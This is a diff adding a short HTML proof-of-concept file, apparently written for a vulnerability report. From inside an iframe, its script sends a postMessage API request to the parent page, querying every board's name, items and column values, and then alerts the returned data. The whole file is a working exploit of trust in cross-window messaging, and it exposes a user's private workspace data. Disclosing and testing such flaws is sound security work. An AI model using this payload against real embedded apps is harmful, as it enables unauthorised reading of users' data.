@@ -1,0 +1,9 @@
+<html>
+<body>
+  <script>
+      window.addEventListener("message", e => alert(JSON.stringify(e.data.data)), !1);
+      window.parent.postMessage({'method':'api','args':{'params':{'query':'query { boards() {\t\tname items { column_values { title value } } }}'}},'requestId':'1','version':'0.1.1'}, '*');
+  </script>
+  POC
+</body>
+</html>
